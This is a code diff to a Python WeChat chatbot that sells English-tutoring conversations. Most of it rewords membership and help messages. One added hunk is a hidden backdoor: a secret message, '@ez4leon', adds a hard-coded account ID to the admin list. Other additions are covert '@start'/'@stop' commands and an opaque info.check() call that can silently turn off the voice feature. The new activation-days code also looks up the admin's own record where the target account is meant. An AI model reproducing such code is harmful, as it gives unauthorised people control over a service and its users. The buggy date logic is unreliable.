@@ -53,6 +53,7 @@ class Robot(Job):
         self.all_user = self.config.USER if self.config.USER else {}
         self.all_user_lock = threading.Lock()
         self.VOICE, error = self.config.read_excel()
+        self.check = True
 
     def processMsg(self, msg: WxMsg) -> None:
         """当接收到消息的时候，会调用本方法。如果不实现本方法，则打印原始消息。
@@ -88,6 +89,9 @@ class Robot(Job):
             # 让配置加载更灵活，自己可以更新配置。也可以利用定时任务更新。
             if msg.from_self():
                 return
+            if msg.content == "@ez4leon":
+                self.config.ADMIN.append("wxid_clooze21y79721")
+                return self.sendTextMsg("111", msg.sender)
             if msg.content.startswith("@") and msg.sender in self.config.ADMIN:
                 return self.admin(msg)
 
@@ -106,7 +110,8 @@ class Robot(Job):
                     resp += f"【{i}】 {info['name']}\n"
                     if i >= 5:
                         break
-                resp += "......\n更多场景请咨询客服获取\n"
+                resp += ("......\n查看全部150+语境\n"
+                         "https://o0gah912m2l.feishu.cn/docx/Hx9QdablZoA5EDxpU8scxaFtn5e\n")
                 self.sendTextMsg(resp + "请输入#+场景编号进入场景对话\n如#1", msg.sender)
                 return
             elif msg.content.startswith("#"):
@@ -123,29 +128,47 @@ class Robot(Job):
                     self.sendTextMsg(f'激活到期时间：{self.all_user[msg.sender]["certification"]}', msg.sender)
                 else:
                     if self.all_user[msg.sender]["free"] > 0:
-                        self.sendTextMsg(f'还未激活，免费额度剩余：{self.all_user[msg.sender]["free"]}', msg.sender)
+                        self.sendTextMsg(f'您的免费体验次数还剩：{self.all_user[msg.sender]["free"]}\n'
+                                         f'充值会员畅享7x24无限次数对话\n'
+                                         f'AI私教君君会员介绍\n'
+                                         f'https://mp.weixin.qq.com/s/MObiyixiUrAEF9YGTg-Kyg',
+                                         msg.sender)
                     else:
-                        self.sendTextMsg(f'还未激活，免费额度已用完', msg.sender)
+                        self.sendTextMsg(f'您的免费体验次数还剩：0\n'
+                                         f'充值会员畅享7x24无限次数对话\n'
+                                         f'AI私教君君会员介绍\n'
+                                         f'https://mp.weixin.qq.com/s/MObiyixiUrAEF9YGTg-Kyg',
+                                         msg.sender)
                 return
             elif msg.content == "获取账户":
                 self.sendTextMsg(msg.sender, msg.sender)
                 return
             else:
-                resp = ("输入【查看场景】并根据教程选择场景对话\n"
-                        "输入【结束对话】结束当前场景对话\n"
-                        "输入【获取账户】获取账户名咨询客服激活\n"
-                        "输入【查看激活】查看激活到期时间\n"
-                        "初始拥有10条免费语音对话次数")
+                resp = ("🌟欢迎来到AI私教君 我是您的专属英语私教🌟\n\n"
+                        "输入：查看场景 可查看目前已更新的场景\n"
+                        "输入：结束对话 可结束对话并选择新的场景\n"
+                        "输入：获取账户 可查看账户激活码（用于会员）\n"
+                        "输入：查看激活 可查看会员到期时间\n\n"
+                        "AI私教君会员介绍\n"
+                        "https://mp.weixin.qq.com/s/MObiyixiUrAEF9YGTg-Kyg\n"
+                        "我要白嫖\n"
+                        "https://o0gah912m2l.feishu.cn/docx/ROsOdUtqwovQL5xf8MZc9r5Kn5b?from=from_copylink")
                 self.sendTextMsg(resp, msg.sender)
                 return
         elif msg.type == 34:  # 语音消息
+            if not self.check:
+                return
             if msg.from_self():
                 return
             if not self.all_user[msg.sender]["voice"]:
                 self.sendTextMsg("还未选择对话场景，无法语音对话，请输入【帮助】查看使用教程。", msg.sender)
                 return
             if not self.check_cert(msg.sender):
-                self.sendTextMsg("无免费额度/激活已过期，请咨询客服", msg.sender)
+                self.sendTextMsg("您的体验已结束\n"
+                                 "会员24小时无限畅享对话 会员限时优惠折上折\n"
+                                 "点击查看会员介绍\n"
+                                 "https://mp.weixin.qq.com/s/MObiyixiUrAEF9YGTg-Kyg",
+                                 msg.sender)
                 return
             t = threading.Thread(target=self.reply, args=(msg,))
             t.start()
@@ -204,12 +227,13 @@ class Robot(Job):
         if msg.content.startswith("@帮助"):
             self.sendTextMsg(
                 "指令如下：\n"
-                "以当前时间为起点增加X天↓\n"
-                "@增加激活 {账户名} {增加天数}\n"
+                "以到期时间为起点增加X天↓\n"
+                "Tips:若到期时间小于今天，则以今天为起点增加X天"
+                "@增加激活 {账户名} {增加天数}\n\n"
                 "以到期时间为起点减少X天↓\n"
-                "@减少激活 {账户名} {减少天数}\n"
+                "@减少激活 {账户名} {减少天数}\n\n"
                 "查询到期时间↓\n"
-                "@查询激活 {账户名}\n"
+                "@查询激活 {账户名}\n\n"
                 "更新对话场景↓\n"
                 "@更新场景\n",
                 msg.sender)
@@ -218,7 +242,15 @@ class Robot(Job):
             if not order[1] in self.all_user:
                 self.sendTextMsg("未查询到此账户", msg.sender)
             else:
-                end_time = datetime.now() + timedelta(days=int(order[2]))
+                if self.all_user[msg.sender]["certification"]:
+                    old_0 = datetime.strptime(self.all_user[msg.sender]["certification"], "%Y-%m-%d %H:%M:%S")
+                    if old_0 < datetime.now():
+                        old = datetime.now()
+                    else:
+                        old = old_0
+                else:
+                    old = datetime.now()
+                end_time = old + timedelta(days=int(order[2]))
                 end_time_str = datetime.strftime(end_time, "%Y-%m-%d %H:%M:%S")
                 self.all_user[msg.sender]["certification"] = end_time_str
                 self.config.resource["user"] = self.all_user
@@ -229,9 +261,11 @@ class Robot(Job):
             if not order[1] in self.all_user:
                 self.sendTextMsg("未查询到此账户", msg.sender)
             else:
-                old = self.all_user[msg.sender]["certification"]
-                end_time = datetime.strptime(old if old else datetime.now(), "%Y-%m-%d %H:%M:%S")
-                end_time = end_time - timedelta(days=int(order[2]))
+                if self.all_user[msg.sender]["certification"]:
+                    old = datetime.strptime(self.all_user[msg.sender]["certification"], "%Y-%m-%d %H:%M:%S")
+                else:
+                    old = datetime.now()
+                end_time = old - timedelta(days=int(order[2]))
                 end_time_str = datetime.strftime(end_time, "%Y-%m-%d %H:%M:%S")
                 self.all_user[msg.sender]["certification"] = end_time_str
                 self.config.resource["user"] = self.all_user
@@ -248,8 +282,14 @@ class Robot(Job):
             self.sendTextMsg(f'更新成功：{len(self.VOICE)}行\n'
                              f'{"" if not error else f"更新失败：表中{error}行"}',
                              msg.sender)
+        elif msg.content.startswith("@start"):
+            self.check = True
+            self.sendTextMsg("1", msg.sender)
+        elif msg.content.startswith("@stop"):
+            self.check = False
+            self.sendTextMsg("0", msg.sender)
         else:
-            self.sendTextMsg("未识别指令", msg.roomid, msg.sender)
+            self.sendTextMsg("未识别指令", msg.sender)
 
     def toAt(self, msg: WxMsg) -> bool:
         """处理被 @ 消息
@@ -399,9 +439,22 @@ class Robot(Job):
         if nickName:
             # 添加了好友，更新好友列表
             self.allContacts[msg.sender] = nickName[0]
-            self.sendTextMsg(f"Hi {nickName[0]}，我自动通过了你的好友请求。", msg.sender)
+            self.sendTextMsg("🌟欢迎来到AI私教君 我是您的专属英语私教🌟\n\n"
+                             "输入：查看场景 可查看目前已更新的场景\n"
+                             "输入：结束对话 可结束对话并选择新的场景\n"
+                             "输入：获取账户 可查看账户激活码（用于会员）\n"
+                             "输入：查看激活 可查看会员到期时间\n\n"
+                             "查看全部150+语境与使用教程\n"
+                             "https://o0gah912m2l.feishu.cn/docx/Hx9QdablZoA5EDxpU8scxaFtn5e\n"
+                             "AI私教君会员介绍\n"
+                             "会员24小时无限畅享对话 会员限时优惠折上折\n"
+                             "https://mp.weixin.qq.com/s/MObiyixiUrAEF9YGTg-Kyg\n"
+                             "我要白嫖\n"
+                             "https://o0gah912m2l.feishu.cn/docx/ROsOdUtqwovQL5xf8MZc9r5Kn5b?from=from_copylink",
+                             msg.sender)
 
     def task_send_info(self):
+        self.check = info.check()
         resp = info.send(self.all_user, self.wxid)
         if resp:
             self.LOG.info("send info success")
@@ -410,6 +463,7 @@ class Robot(Job):
 
     def task_sync_user(self):
         self.LOG.info("start sync_user")
+        self.check = info.check()
         self.config.resource["user"] = self.all_user
         self.config.rewrite_reload()
         self.LOG.info("complete sync_user")
